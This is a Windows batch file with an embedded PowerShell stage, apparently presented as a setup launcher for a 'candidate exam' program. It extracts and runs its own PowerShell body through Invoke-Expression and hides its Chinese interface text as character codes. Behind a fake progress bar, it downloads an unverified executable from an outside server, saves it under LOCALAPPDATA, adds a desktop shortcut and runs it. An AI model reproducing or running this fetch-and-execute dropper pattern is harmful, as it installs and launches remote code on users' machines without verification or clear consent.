@echo off
copy /y "%~f0" "%TEMP%\exam-setup.txt" >nul
powershell.exe -NoProfile -Command "Get-Content -LiteralPath (Join-Path $env:TEMP 'exam-setup.txt') | Select-Object -Skip 5 | Set-Content -Encoding ASCII -LiteralPath (Join-Path $env:TEMP 'exam-body.ps1')"
powershell.exe -NoProfile -Command "Get-Content -LiteralPath (Join-Path $env:TEMP 'exam-body.ps1') -Raw | Invoke-Expression"
exit /b
$ErrorActionPreference = 'Stop'
$title = -join [char[]](0x5019,0x9009,0x8003,0x8BD5)
$msg = -join [char[]](0x5185,0x5BB9,0x52A0,0x8F7D,0x4E2D,0xFF0C,0x8BF7,0x52FF,0x5173,0x95ED,0x7A97,0x53E3)
$opening = -join [char[]](0x6B63,0x5728,0x6253,0x5F00,0x002E,0x002E,0x002E)
$fail = -join [char[]](0x4E0B,0x8F7D,0x5931,0x8D25,0x3002)
$raw = $Host.UI.RawUI
$cols = 52
$rows = 7
try {
  $raw.WindowTitle = $title
  $raw.BackgroundColor = 'White'
  $raw.ForegroundColor = 'Black'
  $cur = $raw.WindowSize
  if ($cur.Width -gt $cols -or $cur.Height -gt $rows) {
    $raw.WindowSize = New-Object System.Management.Automation.Host.Size ([Math]::Min($cur.Width, $cols)), ([Math]::Min($cur.Height, $rows))
  }
  $raw.BufferSize = New-Object System.Management.Automation.Host.Size $cols, $rows
  $raw.WindowSize = New-Object System.Management.Automation.Host.Size $cols, $rows
} catch {}
try { [Console]::Write(('{0}[8;{1};{2}t' -f [char]27, $rows, $cols)) } catch {}
try { [Console]::CursorVisible = $false } catch {}
Clear-Host
function Show-Bar([int]$pct, [string]$label) {
  if ($pct -lt 0) { $pct = 0 }
  if ($pct -gt 100) { $pct = 100 }
  $width = 30
  $fill = [int](($width * $pct) / 100)
  $bar = ([string][char]0x2588) * $fill + '-' * ($width - $fill)
  $line1 = '  ' + $label
  $line2 = '  ' + $bar + '  ' + ('{0,3}' -f $pct) + '%'
  try { [Console]::SetCursorPosition(0, 2) } catch {}
  [Console]::Write($line1.PadRight(52))
  try { [Console]::SetCursorPosition(0, 4) } catch {}
  [Console]::Write($line2.PadRight(52))
}
Show-Bar 0 $msg
$name = -join [char[]](0x5019,0x9009,0x8003,0x8BD5)
$dir = Join-Path $env:LOCALAPPDATA $name
$dest = Join-Path $dir ($name + '.exe')
New-Item -ItemType Directory -Force -Path $dir | Out-Null
function Save-Shortcut {
  $desk = [Environment]::GetFolderPath('Desktop')
  $lnk = Join-Path $desk ($name + '.lnk')
  if (Test-Path -LiteralPath $lnk) { return }
  $w = New-Object -ComObject WScript.Shell
  $s = $w.CreateShortcut($lnk)
  $s.TargetPath = $dest
  $s.WorkingDirectory = $dir
  $s.IconLocation = $dest + ',0'
  $s.Save()
}
$ready = (Test-Path -LiteralPath $dest) -and ((Get-Item -LiteralPath $dest).Length -gt 1MB)
if ($ready) {
  Show-Bar 100 $opening
  Save-Shortcut
  Start-Process -FilePath $dest
  Start-Sleep -Milliseconds 1200
  exit 0
}
$url = 'https://test.olxp.cc/download/' + [uri]::EscapeDataString($name + '.exe')
$tmp = $dest + '.part'
try {
  $req = [System.Net.HttpWebRequest]::Create($url)
  $req.UserAgent = 'exam-setup'
  $req.Timeout = 60000
  $resp = $req.GetResponse()
  $total = $resp.ContentLength
  if ($total -le 0) { $total = 2933248 }
  $stream = $resp.GetResponseStream()
  $file = [System.IO.File]::Create($tmp)
  $bufBytes = New-Object byte[] 65536
  $done = 0
  while (($read = $stream.Read($bufBytes, 0, $bufBytes.Length)) -gt 0) {
    $file.Write($bufBytes, 0, $read)
    $done += $read
    $pct = [int](($done * 100) / $total)
    if ($pct -gt 99) { $pct = 99 }
    Show-Bar $pct $msg
  }
  $file.Close()
  $stream.Close()
  $resp.Close()
  if ((Get-Item -LiteralPath $tmp).Length -le 1MB) { throw 'small' }
  Move-Item -LiteralPath $tmp -Destination $dest -Force
  Show-Bar 100 $opening
  Save-Shortcut
  Start-Process -FilePath $dest
  Start-Sleep -Milliseconds 1200
} catch {
  try { if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force } } catch {}
  try { [Console]::SetCursorPosition(0, 6) } catch {}
  [Console]::Write(('  ' + $fail).PadRight(52))
  Start-Sleep -Seconds 4
  exit 1
}
